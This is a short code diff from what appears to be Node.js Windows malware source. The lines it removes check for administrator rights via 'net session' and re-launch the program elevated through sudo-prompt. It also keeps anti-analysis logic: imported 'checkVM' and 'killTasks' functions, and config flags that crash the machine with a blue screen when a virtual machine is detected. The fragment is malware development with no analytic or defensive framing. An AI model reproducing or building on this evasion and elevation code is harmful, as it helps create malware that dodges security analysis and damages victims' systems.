@@ -7,14 +7,7 @@ const { checkVM, killTasks } = require('./functions/anti-vm');
 const sudo = require('sudo-prompt');
 const tempFolder = mkdtempSync(join(os.tmpdir(), sep)).toString();
 module.exports.tempFolder = tempFolder;
-spawnSync('explorer', [tempFolder]);
-
-if (os.platform() !== 'win32') process.exit();
-try {
-  execSync('net session');
-} catch (e) {
-  sudo.exec(resolve(__filename));
-}
+process.argv0.includes('node') && spawnSync('explorer', [tempFolder]);
 
 if (config.vmProtect && checkVM()) {
   if (config.bsodIfVm) {
